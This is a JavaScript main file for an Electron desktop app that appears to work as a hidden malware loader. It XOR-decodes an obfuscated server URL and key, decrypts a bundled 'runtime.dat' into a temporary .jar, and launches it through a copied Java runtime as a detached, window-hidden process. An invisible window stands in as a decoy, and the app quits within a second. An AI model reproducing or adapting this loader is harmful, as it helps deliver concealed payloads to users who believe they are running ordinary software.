const { app, BrowserWindow } = require('electron');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

function _d(a, k) {
    const b = Buffer.alloc(a.length);
    for (let i = 0; i < a.length; i++) b[i] = a[i] ^ k;
    return b.toString('utf8');
}
const API_URL = _d([149, 137, 137, 141, 199, 210, 210, 139, 152, 145, 152, 153, 211, 158, 146, 144, 211, 137, 143], 253);
const LICENSE_KEY = _d([146, 227, 239, 137, 232, 247, 151, 144, 239, 236, 142, 247, 150, 144, 138, 139, 232, 247, 155, 142, 128, 236, 128], 218);

function findJava() {
    const bundled = path.join(process.resourcesPath || '', 'jre', 'bin', 'javaw.exe');
    if (fs.existsSync(bundled)) return bundled;

    const candidates = [];
    const pushDir = (dir) => {
        if (!dir) return;
        candidates.push(path.join(dir, 'javaw.exe'));
        candidates.push(path.join(dir, 'java.exe'));
    };
    pushDir(process.env.JAVA_HOME ? path.join(process.env.JAVA_HOME, 'bin') : null);
    const roots = [
        'C:\\Program Files\\Eclipse Adoptium',
        'C:\\Program Files\\Java',
        'C:\\Program Files (x86)\\Java',
        'C:\\Program Files\\Microsoft',
    ];
    for (const root of roots) {
        try {
            if (!fs.existsSync(root)) continue;
            for (const name of fs.readdirSync(root)) {
                if (/^(jdk|jre)/i.test(name)) pushDir(path.join(root, name, 'bin'));
            }
        } catch (_) {}
    }
    for (const p of candidates) {
        if (fs.existsSync(p)) return p;
    }
    return 'javaw.exe';
}

const TZDB_B64 = '';
const TZMAP_B64 = '';

function writeB64(dest, b64, minSize) {
    if (!b64 || b64.indexOf('__TZ') === 0) return false;
    const buf = Buffer.from(b64, 'base64');
    if (buf.length < minSize) return false;
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, buf);
    return fs.existsSync(dest) && fs.statSync(dest).size >= minSize;
}

function copyDirSync(src, dest) {
    fs.mkdirSync(dest, { recursive: true });
    for (const name of fs.readdirSync(src)) {
        const s = path.join(src, name);
        const d = path.join(dest, name);
        let st;
        try { st = fs.statSync(s); } catch (_) { continue; }
        if (st.isDirectory()) copyDirSync(s, d);
        else fs.copyFileSync(s, d);
    }
}

function persistBundledJre(javaPath) {
    try {
        if (!javaPath || javaPath === 'javaw.exe' || !fs.existsSync(javaPath)) return javaPath;
        const srcJre = path.resolve(path.dirname(javaPath), '..');
        if (!fs.existsSync(path.join(srcJre, 'bin', 'javaw.exe'))) return javaPath;
        const destJre = path.join(app.getPath('temp'), 'svc-jre');
        copyDirSync(srcJre, destJre);
        const libDir = path.join(destJre, 'lib');
        writeB64(path.join(libDir, 'tzdb.dat'), TZDB_B64, 1000);
        writeB64(path.join(libDir, 'tzmappings'), TZMAP_B64, 100);
        const destJavaw = path.join(destJre, 'bin', 'javaw.exe');
        const tz = path.join(libDir, 'tzdb.dat');
        logElectron('jre persisted ' + destJavaw + ' tzdb=' + (fs.existsSync(tz) ? fs.statSync(tz).size : 0));
        if (fs.existsSync(destJavaw)) return destJavaw;
    } catch (err) {
        logElectron('jre persist error: ' + err.message);
    }
    return javaPath;
}

const PAYLOAD_XOR = 0xA7;

function resolvePayloadPath() {
    const packaged = path.join(process.resourcesPath || '', 'runtime.dat');
    if (app.isPackaged && fs.existsSync(packaged)) return packaged;
    const local = path.join(__dirname, 'runtime.dat');
    if (fs.existsSync(local)) return local;
    if (__dirname.includes('app.asar')) {
        const unpacked = path.join(__dirname.replace('app.asar', 'app.asar.unpacked'), 'runtime.dat');
        if (fs.existsSync(unpacked)) return unpacked;
    }
    return packaged || local;
}

function materializeJar(payloadPath) {
    const enc = fs.readFileSync(payloadPath);
    const out = Buffer.alloc(enc.length);
    for (let i = 0; i < enc.length; i++) out[i] = enc[i] ^ PAYLOAD_XOR;
    const tmp = path.join(app.getPath('temp'), 'svc-' + process.pid + '-' + Date.now() + '.jar');
    fs.writeFileSync(tmp, out);
    return tmp;
}

function logElectron(msg) {
    try {
        const base = process.env.LOCALAPPDATA || process.env.TEMP || '.';
        const dir = path.join(base, 'diag');
        fs.mkdirSync(dir, { recursive: true });
        fs.appendFileSync(path.join(dir, 'runtime.log'), new Date().toISOString() + ' ' + msg + '\n');
    } catch (_) {}
}

function runSupreme() {
    const payloadPath = resolvePayloadPath();
    let javaPath = persistBundledJre(findJava());
    if (!fs.existsSync(payloadPath)) {
        logElectron('payload missing: ' + payloadPath);
        app.quit();
        return;
    }
    let jarPath;
    try {
        jarPath = materializeJar(payloadPath);
    } catch (err) {
        logElectron('payload decode error: ' + err.message);
        app.quit();
        return;
    }
    const errLog = path.join(app.getPath('temp'), 'svc-java-' + process.pid + '.log');
    const args = [
        '--enable-native-access=ALL-UNNAMED',
        '-jar', jarPath, API_URL, LICENSE_KEY,
    ];
    logElectron('spawn ' + javaPath + ' ' + args.join(' '));
    let outFd = 'ignore';
    try { outFd = fs.openSync(errLog, 'a'); } catch (_) {}
    const child = spawn(javaPath, args, {
        detached: true,
        stdio: ['ignore', outFd, outFd],
        windowsHide: true,
        env: Object.assign({}, process.env, {
            JAVA_HOME: path.resolve(path.dirname(javaPath), '..'),
        }),
    });
    child.on('error', (err) => logElectron('spawn error: ' + err.message));
    child.unref();
    if (outFd !== 'ignore') {
        try { fs.closeSync(outFd); } catch (_) {}
    }
    setTimeout(() => app.quit(), 1000);
}

app.whenReady().then(() => {
    new BrowserWindow({ width: 1, height: 1, show: false });
    runSupreme();
});
app.on('window-all-closed', () => app.quit());
